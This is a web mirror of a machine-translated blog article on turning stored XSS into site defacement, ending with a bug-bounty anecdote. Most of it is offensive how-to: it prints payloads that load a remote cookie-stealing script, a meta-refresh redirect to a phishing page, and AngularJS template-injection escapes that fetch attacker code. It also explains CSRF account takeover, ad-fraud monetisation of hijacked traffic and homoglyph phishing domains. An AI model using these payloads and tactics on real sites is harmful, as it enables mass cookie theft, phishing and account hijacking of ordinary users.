<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>We do deface site using XSS</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Deface of the site can be done if you have access to ftp, flooded the shell, etc., but this can also be done using regular XSS. In this article I want...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>We do deface site using XSS</h1><div class="post__text post__text-html js-mediator-article">  Deface of the site can be done if you have access to ftp, flooded the shell, etc., but this can also be done using regular XSS.  In this article I want to tell you <b>how to use Stored XSS</b> in order to change the contents of the main page of a site or a specific page in order to massively <b>steal cookies</b> from users and <b>redirect to your site</b> . <br><br><h3><img src="https://habrastorage.org/getpro/habr/post_images/773/096/0af/7730960afb0d49a1e93fc9e4bca0428d.png" alt="image" align="left">  <b>All information is provided for informational purposes only.</b>  <b>I am not responsible for any possible harm caused by the materials of this article.</b> </h3><br><br><br>  <b>So, what is deface</b> (Wikipedia): <br><blockquote>  Deface (English deface - to disfigure, distort) - the type of site hacking, in which the main (or any other) page of a website is replaced with another one - usually of the calling type: advertisement, warning, threat or joke. <br>  Often, access to the rest of the site is blocked, or the former site content is completely removed. </blockquote><a name="habracut"></a><br>  The main reasons for site deface are: 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      <b>1.</b> Hooliganism, as self-affirmation of novice hackers. <br><br>  <b>2.</b> Advertising, often of questionable products or services.  The site publishes promotional images, links to sites (often infected with viruses), etc. <br><br>  <b>3.</b> Competition between organizations.  One firm brings to a competitor an image and reputational loss through the hacking and deface of their site. <br><br>  <a href="http://www.securitylab.ru/news/425919.php">An example from the 12th year</a> . <br><br>  <b>Stored xss</b> on the main page is most often found (from my experience) on sites that display user activity on the main page.  Mainly: <br><br>  * user added photo 1.jpg; <br>  * user created a topic / blogpost; <br>  * user joined the group; <br>  * User added user as a friend. <br><br>  We can embed the script in the user name, the name of the photo / group / theme, create a second test account and add it as a friend, so the script will run on the main page. <br><br>  Even for the code to be executed by a large number of people, it is not necessary to implement it on the main page, you can embed it in the personal accounts of all users, in the comments of some article, or create an ad on the site, for example, <a href="https://www.openbugbounty.org/incidents/240847/">country.ua</a> (3 000 place in attendance in Ukraine), filtering in the title and in the description of the ad, but it is not in the username. <br><br><img src="https://habrastorage.org/web/3e1/9fb/b31/3e19fbb312824df3b04fbeca128e2927.png"><br><br>  1) Stored xss in the comments on the article / topic - everything is simple here, we write js in the comment field, add, catch logs. <br><br>  2) In order for the code to be executed for each user in the personal account, you need to use xss in conjunction with <b>iDOR</b> .  If using idor, you can change the email of any user, restore the account and hack it - this is good, but what if we can change such data, changing which does not lead to anything (for example, editing notes, user addresses, etc.)? <br><br>  In this case, we need to find a place in the personal account where in the Post or get request you can manipulate the user id, change the data and start searching through all possible id.  It is important that there be stored xss. <br><br>  We can place on the main page the <b>script of theft of cookies</b> , <b>csrf exploit</b> and <b>redirect</b> to a phishing site: <br><br>  1) Theft cookie script <br><br><pre><code class="sql hljs">"&gt;&lt;script src=https://securityz.net/x.js?&gt;</code> </pre> <br>  When we managed to catch cookies, it would be difficult to sort them later, especially the term of many of them ends soon, it will be a plus if the <b>email address of the user is</b> recorded in the cookie (then we can load his account) and the <b>password in md5</b> (I saw many websites that store passwords in cookies). <br><br>  If we do not want to spend time sorting cookies or many cookies in <b>httponly</b> , then we can resort to the second option. <br><br>  2) Redirect to the phishing site of the vulnerable site, link with download of a backdoor or clone paypal / privat24 / sberbank / social network: <br><br><pre> <code class="python hljs">&lt;meta http-equiv=<span class="hljs-string"><span class="hljs-string">"refresh"</span></span> content=<span class="hljs-string"><span class="hljs-string">"1;URL=https://securityz.net/vk.html"</span></span> /&gt;</code> </pre> <br>  3) If there is a private office <b>csrf,</b> we can do a redirect to an exploit csrf example <a href="https://example.com/account%3Fdo%3Dsettings%26email%3Dsupport1%40habrahabr.ru%26city%3Dqwqwqw%26address%3Dqwqwwqqw%26phone%3D11111111%26password%3Dqwerty%26confirm_password%3Dqwerty">example.com/account?do=settings&amp;email=support1@habrahabr.ru&amp;city=qwqwqw&amp;address=qwqwwqqw&amp;phone=11111111&amp;password=qwerty&amp;confirm_password=qwerty</a> , a script to add a figure to an email and get logins and passwords of users, it will be reasonable to immediately use after an exploit logout csrf <a href="https://example.com/%3Flogout">https://example.com?logout</a> so that users cannot access their account and restore it. <br><br>  The interesting thing is that if you do not use a redirect, but simply load js on the page and steal cookies, then the vulnerability may not be noticed for a long time. <br><br>  How to massively hack users, we have already figured out.  Now I will explain <b>how to make money on advertising</b> or <b>to raise your site to the top</b> by attendance. <br><br>  Instead of doing a redirect to phishing sites, we can raise money from the traffic, like a webmaster, simply ‚Äúslipping‚Äù links with advertising to users.  In order to get as much advertising as possible during the time before the vulnerability is fixed, we will load ads in iframes or pop-up windows where they will breed, for example, <a href="https://xakep.ru/2017/04/21/traffic-alchemist/">as these scammers</a> who earn $ 7,000,000 per month with advertising.  Many advertisers who are willing to pay for <a href="http://advmaker.net/webmasters/">link</a> clicks <a href="http://advmaker.net/webmasters/">can be found on the net</a> <s>(not ads)</s> . <br><br>  2) Back in 2004, the authors of xakep.ru <a href="https://xakep.ru/2004/05/17/22378/">understood</a> how to raise their site to the top by introducing the mail.ru counter to the home site, you can do the same. <br><br>  Two examples of my deface from real life: <br><br><ul><li>  XSS on the main page of the <a href="https://agent.privatbank.ua/">social network privatbank.ua</a> (bug bounty).  In this case, the photo is poured into the album, on the main page our name is displayed, in which the redirect to the site, see the video. <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/Q2RZa5-DpPI" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br></li><li>  Client Side Template Injection, which I promoted to xss, on the social network of one of the most popular payment systems (2000 alexarank world, 150 alexa Russia). <br>  Unfortunately, this company did not give permission to mention it in the article: <br><br><blockquote>  We have a negative attitude to such articles. </blockquote><br>  I also think that the news that a critical vulnerability was found on the website of this payment system, which could harm users, would have a bad effect on the company's reputation. <br><br>  Previously, social.example.com was the cms of the old generation, it had a lot of xss, which over time was fixed, now made a new cms on angular.  I did not find a single xss, I decided to check for template injection, payload <code>{{2+2}}</code> issued 4, determining the angular version, picked up this payload <br><br><pre> <code class="hljs delphi"><span class="hljs-comment"><span class="hljs-comment">{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,alert(1),a')}</span></span>}</code> </pre> <br>  It turned out the stored XSS on the user page in the post.  And this xss is performed anywhere on the site: In personal messages, groups, comments, and so on. <br><br>  But the most important thing is the deface of the main page.  When we add a post, it is displayed on everyone on the main page - both by users and guests.  Now we can only trigger an alert. <br><br>  We recall the old article <a href="https://finnwea.com/blog/stealing-passwords-from-mcdonalds-users">hacking mcdonalds</a> using template injection. <br><br><div class="oembed"><twitter-widget class="twitter-tweet twitter-tweet-rendered" id="twitter-widget-0" style="position: absolute; visibility: hidden; display: block; transform: rotate(0deg); width: 500px; margin: 10px auto; max-width: 100%; min-width: 220px;"></twitter-widget><blockquote class="twitter-tweet" align="center" data-twitter-extracted-i155257584259914816="true"><p lang="en" dir="ltr">  Stealing passwords from McDonald's sandbox escape through an AngularJS users: <a href="https://t.co/9KglXbVJFv">https://t.co/9KglXbVJFv</a> cc <a href="https://twitter.com/finnwea">@finnwea</a> <a href="https://t.co/M0tcFtBkjS">pic.twitter.com/M0tcFtBkjS</a> </p>  - Binni Shah (@binitamshah) <a href="https://twitter.com/binitamshah/status/820643744303251459">January 15, 2017</a> </blockquote><script async="" src="//platform.twitter.com/widgets.js" charset="utf-8"></script></div><br><br>  borrow from there payload <code>{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=$.getScript(`https://securityz.net/x.js`)');}}`</code>  <code>{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=$.getScript(`https://securityz.net/x.js`)');}}`</code> and we can safely steal cookies or redirect to a phishing site.  By the way, there is a life hack on phishing sites - if your victim knows how to look in the url and distinguish web sites, then you can replace one letter in the site name with one that is very similar to it.  For example account.go√ògle.com, and if there is also ssl, then it will be difficult to distinguish a fake from the original and there will be a lot of logs in conjunction with deface.  <a href="http://fdmlev.ru/news/krasivye_simvoly_dlja_vkontakte_ili_odnoklasnikov/2010-01-16-145">Latin letters and symbols similar to them</a> .) </li></ul><br>  <b>02/04/2017</b> : Zeprepil vulnerability. <br>  <b>02/04/2017</b> : The vulnerability is fixed. <br>  <b>02/10/2017</b> : The $ 200 reward has been transferred.  Proved the danger by the fact that this is not the usual xss, but deface. <br>  <b>02/16/2017</b> : Additional reward is $ 800.  Total for this vulnerability $ 1000. <br><br>  <b>Conclusion from the article</b> : In the case of xss promotion in deface in bug bounty, you can get much more money for this vulnerability. <br><br>  <a href="https://securityz.net/free_pizza/">Previous article</a> . </div><p>Source: <a href="https://habr.com/ru/post/328276/">https://habr.com/ru/post/328276/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../328264/index.html">Making Space Invaders on Love2d and Lua</a></li>
<li><a href="../328266/index.html">As I wrote my logger. Debriefing</a></li>
<li><a href="../328268/index.html">How to create a truly popular museum application on the example of "Weapons of Heroes." Victory Day is dedicated</a></li>
<li><a href="../328270/index.html">Podcast "Rules of the Game": accounting subtleties for technological (and other) business</a></li>
<li><a href="../328272/index.html">How softrender wrote yes the game wrote</a></li>
<li><a href="../328278/index.html">Wrong nameless</a></li>
<li><a href="../328280/index.html">PostgreSQL indexes - 3</a></li>
<li><a href="../328282/index.html">Classified ads from social. networks. Looking for a better solution</a></li>
<li><a href="../328284/index.html">Game development based on physical simulation (for realistic destructible game world)</a></li>
<li><a href="../328286/index.html">The delay in online broadcasts from a webcam, you heartless bitch</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>